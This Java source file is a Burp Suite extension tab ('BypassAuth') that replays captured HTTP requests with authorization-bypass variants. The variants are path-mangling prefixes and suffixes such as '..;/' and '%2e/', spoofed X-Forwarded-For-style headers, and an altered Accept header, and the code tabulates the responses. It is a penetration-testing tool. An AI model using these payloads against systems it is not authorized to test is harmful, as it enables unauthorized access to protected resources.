package burp.ui;

import burp.*;
import burp.bean.AuthBean;
import burp.utils.Utils;

import javax.swing.*;
import javax.swing.table.AbstractTableModel;
import javax.swing.table.TableColumnModel;
import javax.swing.table.TableModel;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;

/**
 * @Author Xm17
 * @Date 2024-06-22 8:46
 */
public class AuthUI implements UIHandler, IMessageEditorController {
    private JPanel panel; // 主面板
    private static JTable authTable; // auth表格
    private JButton btnClear; // 清空按钮
    private JTextField ipInputField; // ip输入框
    private JButton saveBtn; // ip确认按钮
    private JTabbedPane authtabbedPanereq; // 请求tab
    private JTabbedPane authtabbedPaneresp; // 响应tab
    private IHttpRequestResponse currentlyDisplayedItem; // 当前显示的请求
    private IMessageEditor HRequestTextEditor; // 请求编辑器
    private IMessageEditor HResponseTextEditor; // 响应编辑器
    private static final List<AuthEntry> authlog = new ArrayList<>(); //authlog 列表
    private static final List<String> urlHashList = new ArrayList<>(); // url hash列表
    private static final Lock lock = new ReentrantLock();
    private static String LOCAL_IP = "127.0.0.1";

    @Override
    public IHttpService getHttpService() {
        return currentlyDisplayedItem.getHttpService();
    }

    @Override
    public byte[] getRequest() {
        return currentlyDisplayedItem.getRequest();
    }

    @Override
    public byte[] getResponse() {
        return currentlyDisplayedItem.getResponse();
    }

    @Override
    public void init() {
        setupUI();
        setupData();
    }

    // 初始化数据
    private void setupData() {
        btnClear.addActionListener(new AbstractAction() {
            @Override
            public void actionPerformed(ActionEvent e) {
                // 清空urltable
                authlog.clear();
                HRequestTextEditor.setMessage(new byte[0], true);
                HResponseTextEditor.setMessage(new byte[0], false);
                urlHashList.clear();
                authTable.updateUI();
            }
        });
        saveBtn.addActionListener(new AbstractAction() {
            @Override
            public void actionPerformed(ActionEvent e) {
                if (!ipInputField.getText().equals(LOCAL_IP)) {
                    LOCAL_IP = ipInputField.getText();
                }else {
                    LOCAL_IP = "127.0.0.1";
                }
            }
        });
    }

    // 初始化ui
    private void setupUI() {
        panel = new JPanel();
        panel.setLayout(new BorderLayout());
        // 添加FlowLayout布局,将清空按钮添加
        JPanel topPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
        btnClear = new JButton("Clear");
        topPanel.add(btnClear);

        JLabel ipLabel = new JLabel("IP:");
        topPanel.add(ipLabel);

        ipInputField = new JTextField("127.0.0.1");
        topPanel.add(ipInputField);

        saveBtn = new JButton("Save");
        topPanel.add(saveBtn);

        panel.add(topPanel, BorderLayout.NORTH);

        // 上下分割面板,比例是7：3
        JSplitPane mainsplitPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
        mainsplitPane.setResizeWeight(0.7);
        mainsplitPane.setDividerLocation(0.7);

        // 添加URLTable到mainsplitPane的上边
        authTable = new URLTable(new AuthModel());
        authTable.setAutoCreateRowSorter(true);
        JScrollPane scrollPane = new JScrollPane(authTable);
        mainsplitPane.setTopComponent(scrollPane);

        // 左右分割面板,对称分割
        JSplitPane splitPaneDown = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);
        splitPaneDown.setResizeWeight(0.5);
        splitPaneDown.setDividerLocation(0.5);
        // 添加请求响应到左右分割面板
        authtabbedPanereq = new JTabbedPane();
        HRequestTextEditor = Utils.callbacks.createMessageEditor(AuthUI.this, true);
        authtabbedPanereq.addTab("request", HRequestTextEditor.getComponent());

        authtabbedPaneresp = new JTabbedPane();
        HResponseTextEditor = Utils.callbacks.createMessageEditor(AuthUI.this, false);
        authtabbedPaneresp.addTab("response", HResponseTextEditor.getComponent());
        splitPaneDown.setLeftComponent(authtabbedPanereq);
        splitPaneDown.setRightComponent(authtabbedPaneresp);


        // 添加splitPaneDown到mainsplitPane的下边
        mainsplitPane.setBottomComponent(splitPaneDown);

        panel.add(mainsplitPane, BorderLayout.CENTER);
    }

    @Override
    public JPanel getPanel(IBurpExtenderCallbacks callbacks) {
        return panel;
    }

    @Override
    public String getTabName() {
        return "BypassAuth";
    }

    // auth核心检测方法
    public static void Check(IHttpRequestResponse[] requestResponses) {
        lock.lock();
        try {
            IHttpRequestResponse baseRequestResponse = requestResponses[0];
            IRequestInfo analyzeRequest = Utils.helpers.analyzeRequest(baseRequestResponse);
            String method = analyzeRequest.getMethod();
            String path = analyzeRequest.getUrl().getPath();
            String request = Utils.helpers.bytesToString(baseRequestResponse.getRequest());
            List<IParameter> paraLists = analyzeRequest.getParameters();
            URL rdurlURL = analyzeRequest.getUrl();
            String url = analyzeRequest.getUrl().toString();
            byte[] byte_Request = baseRequestResponse.getRequest();
            int len = byte_Request.length;
            byte[] body = Arrays.copyOfRange(byte_Request, analyzeRequest.getBodyOffset(), len);
            // url 中匹配为静态资源
            if (Utils.isUrlBlackListSuffix(url)) {
                return;
            }

            List<String> headers = Utils.helpers.analyzeRequest(baseRequestResponse).getHeaders();
            String urlWithoutQuery = "";
            try {
                URL url1 = new URL(url);
                String protocol = url1.getProtocol();
                String host = url1.getHost();
                int port = url1.getPort();
                urlWithoutQuery = protocol + "://" + host + ":" + port;
            } catch (MalformedURLException e) {
                throw new RuntimeException(e);
            }
            List<AuthBean> authRequests = new ArrayList<>();
            authRequests.addAll(prefix(method, path));
            authRequests.addAll(suffix(method, path));

            if (Objects.equals(method, "GET") || Objects.equals(method, "POST")) {
                for (AuthBean value : authRequests) {
                    if (Objects.equals(value.getMethod(), "GET")) {
                        String new_request = request.replaceFirst(path, value.getPath());
                        IHttpRequestResponse response = Utils.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), Utils.helpers.stringToBytes(new_request));
                        String requrl = urlWithoutQuery + value.getPath();
                        String statusCode = String.valueOf(Utils.helpers.analyzeResponse(response.getResponse()).getStatusCode());
                        String length = String.valueOf(response.getResponse().length);
                        add(method, requrl, statusCode, length, response);
                    } else if (Objects.equals(value.getMethod(), "POST")) {
                        String new_request = request.replaceFirst(path, value.getPath());
                        IHttpRequestResponse response = Utils.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), Utils.helpers.stringToBytes(new_request));
                        String requrl = urlWithoutQuery + value.getPath();
                        String statusCode = String.valueOf(Utils.helpers.analyzeResponse(response.getResponse()).getStatusCode());
                        String length = String.valueOf(response.getResponse().length);
                        add(method, requrl, statusCode, length, response);
                    }
                }
                // 测试伪造ip
                List<AuthBean> testHeaders = forgeHeaders(method, url);
                for (AuthBean header : testHeaders) {
                    headers.add(header.getHeaders());
                }
                byte[] message = Utils.helpers.buildHttpMessage(headers, body);
                IHttpRequestResponse response = Utils.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), message);
                String statusCode = String.valueOf(Utils.helpers.analyzeResponse(response.getResponse()).getStatusCode());
                String length = String.valueOf(response.getResponse().length);
                add(method, url, statusCode, length, response);
                for (AuthBean header : testHeaders) {
                    headers.remove(header.getHeaders());
                }
                // 单独测试实战绕过案例
                changeAccept(headers, body, method, url, baseRequestResponse);
            }
        } finally {
            lock.unlock();
        }
    }

    // 添加数据到表格
    private static void add(String method, String url, String statuscode, String length, IHttpRequestResponse baseRequestResponse) {
        synchronized (authlog) {
            int id = authlog.size();
            authlog.add(new AuthEntry(id, method, url, statuscode, length, baseRequestResponse));
            authTable.updateUI();
        }
    }

    // 添加后缀
    public static List<AuthBean> suffix(String method, String path) {
        if (path.startsWith("//")) {
            path = "/" + path.substring(2).replaceAll("/+", "/");
        }
        List<AuthBean> authRequests = new ArrayList<>();
        if (path.endsWith("/")) {
            path = path.substring(0, path.length() - 1);
            List<String> payloads = Arrays.asList(path + "%2e/", path + "/.", "./" + path + "/./", path + "%20/",
                    "/%20" + path + "%20/", path + "..;/", path + "?", path + "??", "/" + path + "//",
                    path + "/", path + "/.randomstring");
            for (String payload : payloads) {
                if ("GET".equals(method)) {
                    authRequests.add(new AuthBean("GET", payload, ""));
                } else if ("POST".equals(method)) {
                    authRequests.add(new AuthBean("POST", payload, ""));
                }
            }
        } else {
            List<String> payloads = Arrays.asList(path + "/%2e", path + "/%20", path + "%0d%0a", path + ".json", path + "/.randomstring");

            for (String payload : payloads) {
                if ("GET".equals(method)) {
                    authRequests.add(new AuthBean("GET", payload, ""));
                } else if ("POST".equals(method)) {
                    authRequests.add(new AuthBean("POST", payload, ""));
                }
            }
        }
        return authRequests;
    }

    // 添加前缀
    public static List<AuthBean> prefix(String method, String path) {
        if (path.startsWith("//")) {
            path = "/" + path.substring(2).replaceAll("/+", "/");
        }
        List<AuthBean> authRequests = new ArrayList<>();
        String[] prefix = {";/", ".;/", "images/..;/", ";a/", "%23/../", "..;/..;/"};
        for (String s : prefix) {
            // 将路径按 / 分割为多个部分
            String[] pathParts = path.split("/");
            for (int i = 1; i < pathParts.length; i++) {
                // 输出从第二个部分到最后一个部分
                String[] subPathParts = Arrays.copyOfRange(pathParts, i, pathParts.length);
                String[] prePathParts = Arrays.copyOfRange(pathParts, 1, i);
                if (prePathParts.length > 0) {
                    if ("GET".equals(method)) {
                        authRequests.add(new AuthBean("GET", "/" + String.join("/", prePathParts) + "/" + s + String.join("/", subPathParts), ""));
                    } else if ("POST".equals(method)) {
                        authRequests.add(new AuthBean("POST", "/" + String.join("/", prePathParts) + "/" + s + String.join("/", subPathParts), ""));
                    }
                } else {
                    if ("GET".equals(method)) {
                        authRequests.add(new AuthBean("GET", "/" + s + String.join("/", subPathParts), ""));
                    } else if ("POST".equals(method)) {
                        authRequests.add(new AuthBean("POST", "/" + s + String.join("/", subPathParts), ""));
                    }
                }
            }
        }

        return authRequests;
    }

    // 添加头部
    public static List<AuthBean> forgeHeaders(String method, String url) {
        List<AuthBean> authRequests = new ArrayList<>();
        List<String> payloads = Arrays.asList(
                "X-Forwarded-For: %s",
                "X-Originating-IP: %s",
                "X-Remote-IP: %s",
                "X-Remote-Addr: %s"
        );
        // 对payloads进行替换
        payloads.replaceAll(s -> String.format(s, LOCAL_IP));

        for (String payload : payloads) {
            if ("GET".equals(method)) {
                authRequests.add(new AuthBean("GET", "", payload));
            } else if ("POST".equals(method)) {
                authRequests.add(new AuthBean("POST", "", payload));
            }
        }
        return authRequests;
    }

    // 添加accept
    // https://mp.weixin.qq.com/s/6YMDu6FTLa_9s6_mewrp0A
    public static void changeAccept(List<String> headers, byte[] body, String method, String url, IHttpRequestResponse baseRequestResponse) {
        // 判断headers立马是否有Accept,如果有则删除
        headers.removeIf(header -> header.startsWith("Accept:"));
        headers.add("Accept: application/json, text/javascript, /; q=0.01");
        byte[] message = Utils.helpers.buildHttpMessage(headers, body);
        IHttpRequestResponse response = Utils.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), message);
        // 发送请求
        String statusCode = String.valueOf(Utils.helpers.analyzeResponse(response.getResponse()).getStatusCode());
        String length = String.valueOf(response.getResponse().length);
        add(method, url, statusCode, length, response);
    }

    // auth实体
    private static class AuthEntry {
        private final int id;
        private final String method;
        private final String url;
        private final String status;
        private final String length;
        private final IHttpRequestResponse requestResponse;


        public AuthEntry(int id, String method, String url, String status, String length, IHttpRequestResponse requestResponse) {
            this.id = id;
            this.method = method;
            this.url = url;
            this.status = status;
            this.length = length;
            this.requestResponse = requestResponse;
        }
    }

    // auth 模型
    private static class AuthModel extends AbstractTableModel {

        @Override
        public int getRowCount() {
            return authlog.size();
        }

        @Override
        public int getColumnCount() {
            return 5;
        }

        @Override
        public Object getValueAt(int rowIndex, int columnIndex) {
            switch (columnIndex) {
                case 0:
                    return authlog.get(rowIndex).id;
                case 1:
                    return authlog.get(rowIndex).method;
                case 2:
                    return authlog.get(rowIndex).url;
                case 3:
                    return authlog.get(rowIndex).status;
                case 4:
                    return authlog.get(rowIndex).length;
                default:
                    return null;
            }
        }

        @Override
        public String getColumnName(int column) {
            switch (column) {
                case 0:
                    return "id";
                case 1:
                    return "method";
                case 2:
                    return "url";
                case 3:
                    return "status";
                case 4:
                    return "length";
                default:
                    return null;
            }
        }
    }

    // auth 表格
    private class URLTable extends JTable {
        public URLTable(TableModel dm) {
            super(dm);
            TableColumnModel columnModel = getColumnModel();
            columnModel.getColumn(0).setMaxWidth(50);
            columnModel.getColumn(4).setMaxWidth(50);
        }

        @Override
        public void changeSelection(int row, int col, boolean toggle, boolean extend) {
            AuthEntry logEntry = authlog.get(row);
            HRequestTextEditor.setMessage(logEntry.requestResponse.getRequest(), true);
            if (logEntry.requestResponse.getResponse() == null) {
                HResponseTextEditor.setMessage(new byte[0], false);
            } else {
                HResponseTextEditor.setMessage(logEntry.requestResponse.getResponse(), false);
            }
            currentlyDisplayedItem = logEntry.requestResponse;
            super.changeSelection(row, col, toggle, extend);
        }
    }


}
